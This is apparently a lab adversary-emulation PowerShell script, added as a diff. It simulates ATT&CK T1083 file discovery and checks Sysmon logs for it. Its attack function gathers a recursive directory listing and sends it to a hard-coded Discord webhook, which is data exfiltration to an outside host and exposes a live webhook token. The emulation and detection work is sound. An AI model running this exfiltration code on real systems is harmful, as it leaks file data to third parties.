@@ -1,0 +1,105 @@
+# Define the Discord webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1290474648332538008/z30dSUaRmkNXd-oCdndDF6h4uuBjf_JqIRLcgPg8WYp0HLe26WOGDPZXpJNg1iyx4LOP"
+
+# Function to simulate ATT&CK technique known as T1083 (File and Directory Discovery)
+function attackCode {
+    # Define output file path
+    $filePath = "C:\Users\vagrant\AppData\Local\Temp\MediSecureComputerInformation.txt"  # Use a full path for consistency
+
+    # Check if file exists, if not create it
+    if (-not (Test-Path $filePath)) {
+        New-Item -Path $filePath -ItemType File
+    }
+
+    # Append file system information to the output file
+    Get-ChildItem -Recurse | Out-File -FilePath $filePath -Append  # Appending output to the file
+    Write-Host "Appended file system information to $filePath."
+
+    # Read the file content
+    $content = Get-Content -Path $filePath -Raw
+    Write-Host "Successfully read the file content."
+
+    # Send content to Discord webhook in chunks
+    $maxChunkSize = 2000
+    $lines = $content -split "`n"
+    $currentChunk = ""
+
+    foreach ($line in $lines) {
+        if (($currentChunk.Length + $line.Length + 1) -gt $maxChunkSize) {
+            Send-ToDiscordWebhook -message $currentChunk
+            $currentChunk = $line
+        } else {
+            if ($currentChunk.Length -gt 0) {
+                $currentChunk += "`n"
+            }
+            $currentChunk += $line
+        }
+    }
+
+    # Send any remaining chunk
+    if ($currentChunk.Length -gt 0) {
+        Send-ToDiscordWebhook -message $currentChunk
+    }
+}
+
+# Function to send messages to Discord webhook with rate limiting
+function Send-ToDiscordWebhook {
+    param (
+        [string]$message
+    )
+    $attempt = 0
+    $maxAttempts = 5
+
+    while ($attempt -lt $maxAttempts) {
+        try {
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body (@{content = $message} | ConvertTo-Json)
+            Write-Host "Sent chunk of content."
+            return
+        } catch {
+            if ($_.Exception.Response.StatusCode -eq 429) {  # Rate limit error
+                $retryAfter = ($_.Exception.Response.GetResponseHeader("Retry-After") -as [int]) + 1
+                $waitTime = [math]::Min([math]::Pow(2, $attempt), 30)  # Exponential backoff with a cap at 30 seconds
+                Write-Host "Rate limited. Retrying after $waitTime seconds."
+                Start-Sleep -Seconds $waitTime
+                $attempt++
+            } else {
+                Write-Host "Failed to send message to Discord webhook. Error: $_"
+                return
+            }
+        }
+    }
+
+    Write-Host "Exceeded max attempts to send message."
+}
+
+# Function to detect events in Sysmon logs for T1083 (File and Directory Discovery)
+function detectAttack {
+    # Get today's date
+    $today = Get-Date -Format "yyyy-MM-dd"
+
+    # Get the last 10 Sysmon events that include T1083
+    $events = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | 
+              Where-Object { $_.Message -like "*T1083*" -and $_.TimeCreated -ge (Get-Date).Date } | 
+              Select-Object -First 10
+
+    # Output the events if any are found
+    if ($events) {
+        Write-Host "Detected the following Sysmon events for T1083 (File and Directory Discovery) from today:"
+        foreach ($event in $events) {
+            $event | Format-List
+        }
+    } else {
+        Write-Host "No Sysmon events for T1083 detected today."
+    }
+}
+
+# Main execution logic
+if ($args[0] -eq "T1083") {
+    Write-Host "Running attackCode function..."
+    attackCode
+} elseif ($args[0] -eq "detect") {
+    Write-Host "Running detectAttack function..."
+    detectAttack
+} else {
+    Write-Host "Usage: script.ps1 T1083|detect"
+}
